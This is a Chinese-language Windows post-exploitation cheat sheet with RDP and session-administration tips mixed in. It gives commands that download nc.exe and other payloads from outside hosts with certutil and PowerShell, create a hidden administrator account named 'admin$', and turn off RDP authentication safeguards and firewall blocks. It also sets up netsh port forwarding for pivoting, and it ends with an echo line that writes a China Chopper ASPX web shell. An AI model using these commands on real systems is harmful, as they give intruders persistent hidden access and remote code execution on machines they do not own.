

## 下载文件

certutil -urlcache -split -f http://11.1.63.39/nc.exe

powershell
```ts
$client = new-object System.Net.WebClient
$client.DownloadFile(‘http://payloads.online/file.tar.gz', ‘E:\file.tar.gz’)
```
### certuil
```
certuil -encode in out # 转base64
certuil -decode out in # 还原
```
## 渗透后置操作

```bat
net user admin$ tuser321 /add
net localgroup administrators admin$ /add
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow

:: 开启远程
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
echo 远程桌面端口 port number is 
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber

gpupdate /force
# 查看开了哪些端口
netstat -aon

:: 关闭远程
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /D 0 /f
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
```

## FAQ
###  终端服务器超过最大允许连接数
远程桌面界面，在地址栏上 1.1.58.58:65535 /admin

或cmd `mstsc /admin /v:1.1.58.58:65535` ,  此方式不能操作剪贴版
### cmd下信息乱码

```shell
# set utf8
chcp 65001
```

### 终端操作
```
# 查询
qwinsta 查询连接
query session
query user
# kill
log off <id>
tsdiscon rdp-tcp#946
rwinsta <id>关闭连接
```

## TODO
1.TODO: 终端服务器超过最大允许连接数 修改
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 10 /f

# https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TerminalServer::TS_MAX_CON_POLICY
tsadmin 可看连接
```
## 查找文件 
win7以上
```ts
find F:\Downloads #查找目录下所有文件　
find F:\Downloads | findstr Apifox      # 过滤Apifox
```
xp/2003

dir \calendar /s
dir D:\ /s | findstr /i txt >c:\tmp.txt


## 端口转发
win7以上
```bash
netsh interface portproxy add v4tov4 listenport=4546 connectaddress=1.1.58.59 connectport=1521
netsh interface portproxy delete v4tov4 listenport=4546 listenaddress=1.1.58.58
netsh interface portproxy show all
netsh interface portproxy reset
```


## 注册表添加删除程序
x64
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\

## echo 相关

转义用^

aspx
```
echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["chopper"],"unsafe");%^>  >1
```
